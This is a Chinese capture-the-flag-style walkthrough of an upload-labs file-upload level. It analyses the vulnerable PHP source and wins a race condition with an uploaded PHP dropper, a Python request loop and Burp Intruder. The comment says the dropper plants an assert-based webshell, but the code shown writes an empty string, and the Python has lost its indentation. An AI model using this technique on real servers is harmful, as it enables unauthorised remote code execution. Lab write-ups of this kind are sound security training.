### 源码分析：  

$is_upload = false;

$msg = null;

if(isset($_POST['submit'])){ //设置是否提交

$ext_arr = array('jpg','png','gif'); //可以提交后缀名的白名单

$file_name = $_FILES['upload_file']['name']; //上传原文件名 比如18.php

$temp_file = $_FILES['upload_file']['tmp_name']; // 上传之后的临时文件路径
C:\Users\admin\AppData\Local\Temp\phpE47F.tmp

$file_ext = substr($file_name,strrpos($file_name,".")+1);

//
strrpos（从原文件名，找到".",取"."和后面的后缀名也就是.php）+1也就是从p的位置开始取，取到php扩展名，下角标是从0开始算起，所以1的位置就是p

$upload_file = UPLOAD_PATH . '/' . $file_name; //UPLOAD_PATH 就是../upload
拼接/再拼接原文件名18.php,最后组成../upload/18.php

if(move_uploaded_file($temp_file, $upload_file)){ //move_uploaded_file
移动文件（将临时文件移动到$upload_file也就是../upload/18.php）

if(in_array($file_ext,$ext_arr)){
//在$ext_arr白名单数组中找$file_ext的后缀名php进行验证，如果存在就走下面，否则走else

$img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
//如果传递jpg图片是有随机数拼接上当前的详细时间最后图片路径：../upload/4520211024160145.jpg

rename($upload_file, $img_path);
//重命名，把../upload/18.jpg重命名为../upload/4520211024160145.jpg

$is_upload = true;

}else{

$msg = "只允许上传.jpg|.png|.gif类型文件！";

unlink($upload_file); //如果不是白名单里的后缀则删除原文件../upload/18.php

}

}else{

$msg = '上传出错！';

}

}

  

从18关的一波分析来看，后缀必须是.jpg.png.gif才能通过，又不存在文件包含漏洞，但发现这里有个关键点，如果上传的是18.php文件，判断完之后再删除，而且我们也知道上传的路径，则可以再删除之前重新创建新的一个php文件。以下准备18.php内容：

  

<?php  

echo md5(1);

fputs(fopen('shell.php','w'),'');

?>

  

再准备一个py脚本文件，否则手动请求../upload这个路径的话，效率太慢，可能比不过程序运行速度就已经删掉了18.php文件。exp.py脚本内容如下：

  

import requests

def main():

i=0

while 1:

try:

print(i,end='\r')

a = requests.get("http://www.upload.test/upload/18.php")

if "c4ca4238a0b923820dcc509a6f75849b" in a.text:

print( "OK")

break

except Exception as e:

pass

i+=1

main()

  

 **解析18.php语句：**

//首先打开文件，创建shell.php文件把一句话木马写入到shell.php，也就是这一串变形木马，$a=assert;再传递给$a就连成一句话木马assert($_POST[cmd]);

fputs(fopen('shell.php','w'),'');

  

 **注意要修改exp.py部分语句：**

//这是根据你自己网站上的域名，后面跟上相对路径/upload/18.php，也就是你要上传的文件名

a = requests.get("http://www.upload.test/upload/18.php")

  

以下步骤要用到Burp Suite抓包工具，首先先上传18.php，浏览器代理开起来，点击上传进行抓包

![](https://image.3001.net/images/20211024/1635065563_61751edb0f58c873dd1ad.png!small)  

![](https://image.3001.net/images/20211024/1635065643_61751f2bb312ebc75ec37.png!small)  

发送到Intruder模块中，以下步骤图片所示：

![](https://image.3001.net/images/20211024/1635065712_61751f700d32b48231dd2.png!small)  

![](https://image.3001.net/images/20211024/1635065789_61751fbd4aae1b4c19e99.png!small)  

![](https://image.3001.net/images/20211024/1635065802_61751fcab4a726b80902e.png!small)  

![](https://image.3001.net/images/20211024/1635065818_61751fda8fd7550514d18.png!small)  

![](https://image.3001.net/images/20211024/1635065829_61751fe56f97b4f5ff6dc.png!small)  

![](https://image.3001.net/images/20211024/1635065841_61751ff1f1ca77902a235.png!small)  

最后可以用蚁剑进行连接了。

  

  

